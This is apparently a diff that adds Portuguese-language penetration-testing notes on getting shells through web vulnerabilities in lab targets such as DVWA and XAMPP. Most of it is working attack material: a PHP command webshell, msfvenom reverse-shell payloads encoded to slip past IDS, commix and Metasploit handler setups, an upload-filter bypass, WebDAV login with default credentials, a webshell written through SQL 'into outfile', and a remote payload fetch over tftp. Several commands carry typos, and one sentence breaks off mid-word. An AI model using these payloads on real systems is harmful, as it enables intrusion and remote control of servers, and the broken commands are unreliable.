@@ -1,0 +1,266 @@
+Exemplo de Webshell - Obter acesso ao shell atraves de vulnetabvilidades Web
+
+Formulario PHP para CMD execution:
+######################
+###Arquivo shell.php
+<form action="shell.php" method="POST">
+Comando: <br>
+<input type="text" name="comando">
+<input type="submit" name="executa" value="Executa">
+</form>
+
+<?php
+  system($_POST['comando']);
+?>
+#####################
+
+Vulnerabilidade pode ser explorada em aplicações que executa comandos "online" (Ex: ping, nmap, whois e etc).
+
+Jogar o arquivo na aplicação vulneravel, seja com wget ou netcat
+--------------------------
+
+Ferramenta para teste de aplicações de execução de comando:
+
+Usar o github para baixar a aplicação:
+
+git clone https://github.com/stasinopoulos/commix
+
+Entrar no diretorio criado.
+
+####Usar o burp para usar o cookie da aplicação capturada para testar
+
+Usando o scriipt:
+
+python commix.py --url="http://192.168.136.140:/dvwa/vulnerabilities/exec/ --data="ip"=INJECT_HERE&submit=submit" --cookie="security=low; PHPSESSID=0ae455d522g24saa426f22fae"
+
+#--url = Informa a url da pagina vulneravel
+#--data = Informa a variavel vulneravel (Verificar o cofigo fonte da aplicação e identificar qual a variavel do formulario é utilizada para fazer o submit), e solicita injeção de codico
+#--cookie = É coletado do burp
+
+###Depois de explorada a falha pelo script, ganhamos uma sessão "meterpreter" utilizando o comando reverse_tcp do shell e setando as opções co commix;
+
+Ex: 
+commix(os_shell) > reverse_tcp
+commix(reverse_tcp_lhost) > 192.168.136.12
+commix(reverse_tcp_lport) > 2400
+
+Escolher shell reverse, ou verificar os tipos de shell existente (Ha opção do meterpreter com Python e php)
+
+###Caso tenha setado a opção meterpreter em python, usar o msfconsole para fazer o payload da aplicação. 
+OBS: AGUARDAR O CARREGAMENTO DO PAYLOAD DO MSFCONSOLE PARA SETAR A OPÇÂO
+
+msfconsole
+
+use mult/handler
+
+set PAYLOAD python/meterpreter/reverse_tcp
+
+set LPORT 2400    (Essa porta precisa ser a mesma configurada no commix)
+
+set LPORT 192.168.136.12
+
+exploit
+
+###Nesse ponto ja teremos acesso ao meterpreter.
+---------------------------------------------------
+
+Burlando processo de upload de arquivos.
+
+Gerar meterpreter baseado em php e jogar dentro do sistema:
+
+msfvenon -p php/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -f raw > /root/shell.php
+####Ha alguns sistemas PHP que identificam arquivos vulneraveis
+####Sistemas IDS identificam esse tipo de arquivo
+
+Para dificultar a identificação do php malicioso usar o encoder php/base64 na criação do arquivo com a opção "-e"
+
+msfvenon -p php/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -e php/base64 -f raw > /root/shell.php
+###É necessario apos criar o arquivo, adicionar as TAGS php "<?php" e "?>"
+
+####Para burlar sistemas que verificam o arquivo de upload, de extensão de arquivo por exemplo, usar o burp para interceptar o trafego
+
+Entrar no burp, na aba proxy, ligar o "intercept on"
+
+-Fazer o upload do arquivo malicioso (caso necessario renomear o arquivo com a extensão solicitada pela aplicação)
+-No burp, na aba "raw" que interceptou a requisição http do upload, identificar a requisição com o nome do arquivo (Ex: shell.php.jpeg)
+-Alterar o nome para (shell.php)
+-Clicar no botão forward, para enviar a requisição para o sistema (Aplicação)
+-No exemplo acima, podemos obter sucesso em burlar o sistema e enviado o arquivo php malicioso para o sistema
+###É importante tentar identificar o diretorio em que o arquivo foi upado, pois precisaremos posteriormente acessa-lo via browser
+
+###O arquivo que enviamos contem um payload meterpreter, para explorar:
+
+Abrir o msfconsole e mult/handler e usar o payload php:
+
+msfconsole
+
+use mult/handler
+
+set PAYLOAD php/meterpreter/reverse_tcp
+
+set LPORT 4444
+
+set LHOST 192.168.1.10
+
+exploit
+
+###Nesse ponto o meterpreter ja aguarda conexão 
+-É necessario desligar o modo "intercept on" no burp
+
+Para fazer a conexão com o meterpreter, identificar localização do arquivo malicioso dentro da aplicação e acessar via browser.
+EX: http://192.168.1.10/dvwa/hackeable/uploads/shell.php
+
+------------------------------------------
+
+Shell via Webdav (O webdav é um sistema "ftp" para transferencia de dados via WEB)
+-Essa aplicação faz parte do XAMPP
+-Muitas vezes as pessoas instalam o XAMPP e nem sebem que existe essa aplicação instalada (WEBDAV) por isso não alteram a senha padrão
+
+Para exploração, usar o payload php/meterpreter/reverse_tcp:
+
+msfvenon -p "php/meterpreter/reverse_tcp" lport=4444 lhost=192.168.1.10 -f raw > arquivo.php
+###Caso precise usar o encoder, usar a opção " -e php/base64" e adicionar as TAGS php no arquivo
+
+Para ter acesso ao FTP no servidor remoto, usamos o aplicativo "cadaver":
+
+cadaver http://192.168.1.11/webdav
+###Inserir o usuario e senha solicitado: user: wamp, pass: xampp   (Caso usuario não tenha alterado a senha)
+###Caso o usuario tiver alterado a senha, poderemos utilizar a "força bruta" para ganhar acesso ao FTP.
+
+Para transferir o arquivo php infectado, dentro do FTP:
+
+put arquivo.php
+
+###Antes de executar o arquivo, precisamos configurar o mult/handler para ganhar acesso ao meterpreter
+
+msfconsole
+
+use mult/handler
+
+set PAYLOAD php/meterpreter/reverse_tcp
+
+set LPORT 4444
+
+set LHOST 192.168.1.10
+
+exploit
+
+###Para abrir o arquivo malicioso e ganhar a sessao meterpreter, abrir o arquivo via browser
+
+http://192.168.1.11/webdav/arquivo.php
+
+###Nesse ponto ja teremos acesso ao meterpreter com acesso completo ao sistema
+
+---------------------------------
+
+Injeção de SHELL via query SQL
+
+-Essa falha pode ser explorada quando as permissões de gravação não estão bem configuradas
+
+Podemos enviar um arquivo php malicioso, que executa uma shell, conforme ja vimos com o "metodo GET"
+### O metodo GET usa variavel passada via URL, ja o metodo POST, usa um formulario.
+
+Esse arquivo pode ser gerado via SQL injection, ou SQL query, por exemplo:
+
+select "<?php system($GET_['comando']); ?>" into outfile "c:\\xampp\\htdocs\\arquivo.php"
+###Usamos o metodo system, com o metodo GET e variavel comando (Executa comandos internos pela variavel comando)
+###O into outfile, guarda em arquivo o select que executamos.
+###Usamos o "\\" no caminho do arquivo, para não ter erro de criar o arquivo com o nome ajuntado (cxampphtdocarquivo.php)
+
+Para explorarmos o arquivo php que executa comandos do sistema, é preciso usar via url:
+###Como salvamos na RAIZ da aplicação XAMPP, podemos chamar o php criado com a requisição seguinte:
+
+http://192.168.1.11:/arquivo.php
+
+Como passamos a variavel comando com o metodo GET, para explorar a falha devemos usar na URL o "comando" seguido do comando que desejamos utilizar:
+
+http://192.168.1.11:/arquivo.php?comando=dir  (Lista o diretorio corrente)
+
+---------------------------------------
+
+Podemos ganhar acesso meterpreter, usando o tftpd no linux para jogar nosso arquivo infectado para a vitima
+###O TFTP é disponivel no XAMPP com o windows XP, porem a microsoft removeu do Windows 7
+
+#####################################################
+###Podemos testar o start do serviço no windows, com o comando:
+ sc create tftpdsvc binPath= C:\Windows\System32\tftpd.exe DisplayName= "TFTP Server" start= auto
+-O comando acima cria o serviço e faz o start automatico, possibilitamos que usemos o tftp em vitimas que não possuem a aplicação
+
+###Podemos usar o comando acima com o arquivinho php que executa comandos, que criamos anteriormente.
+
+http://192.168.1.11/arquivo.php?comando=sc create tftpdsvc binPath= C:\Windows\System32\tftpd.exe DisplayName= "TFTP Server" start= auto
+#######################################################
+Para habilitar o serviço no linux:
+
+service atftpd start
+###Padrão de localização de arquivos dessa aplicação FTP (Raiz da aplicação):
+/srv/tftp
+
+Copiar o arquivo infectado para o diretorio /srv/tftp
+
+cp /root/meterpreter.php /srv/tftp  (Caso não tenha o arquivo infectado gerado, gerar com o msfvenon)
+
+-Usar o arquivo que criamos anteriormente para executar comandos no servidor via URL, para transferir o arquivo "meterpreter.php" infectado, para a aplicação remota.
+
+http://192.168.1.11/arquivo.php?comando=tftp 192.168.1.10 get meterpreter.php
+###Note que executamos o comando "tftp 192.168.1.10 get meterpreter.php" na aplicação, portanto o arquivo "meterpreter.php" ira ser transferido com sucesso"
+
+Para explorar a falha, abrir o mult/handler e exploitar, aguardando pela abertura do arquivo meterpreter na url da vitima.
+
+msfconsole
+
+use mult/handler
+
+set PAYLOAD php/meterpreter/reverse_tcp
+
+set LPORT 4444
+
+set LHOST 192.168.1.10
+
+exploit
+
+###Nesse ponto ja estaremos aguardando a conexão
+
+Abrir o arquivo php no browser;
+
+http://192.168.1.11/meterpreter.php
+
+###Acesso ao meterpreter ja disponivel
+
+-------------------------------------------------------------------
+
+File Inclusion
+
+-Essa vulnerabilidade permite gerar codigo ou em arquivos novos, ou em ja existentes
+###Para identificar essa falha, podemos em aplicações FTP anomimos via Web, ou aplicações que dão acesso a determinada pasta do sistema, tentar mudar de pasta para identificar, ex: digitar "/etc" ou "/home" etc
+
+ferramenta para identificação de falha:
+
+Panoptic
+
+Para instalar:
+
+git clone https://github.com/lightos/Panoptic.git
+
+cd Panoptic
+
+-Usando o script:
+###Precisamos capturar o cookie com o burp
+
+python panoptic.py --cookie="security=low; PHPSESSID=0aee4112saaacdad11da4a5a23as21" -u "URL_DA_APLICAÇÂO"
+
+A aplicação acima, ira identificar arquivos senssiveis, que serão acessiveis da propria URL.
+EX: arquivos de configuração, logs de aplicações e etc.
+
+Caso tenhamos acesso ao access.log do apache da aplicação remota, sera importante acessar o arquivo via browser, para identificar possivel falha.
+
+Na maquina linux, execu
+
+Para explorar a aplicação, é preciso gerar o arquivo infectado no kali:
+
+msfvenon -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -f elf > shell
+###O formato passado pelo parametro "-f" é o padrão de execução do linux "elf"
+###No linux, é preciso especificar no payload, a arquitetura do sistema, nesse exemplo o "x86"
+
+
+
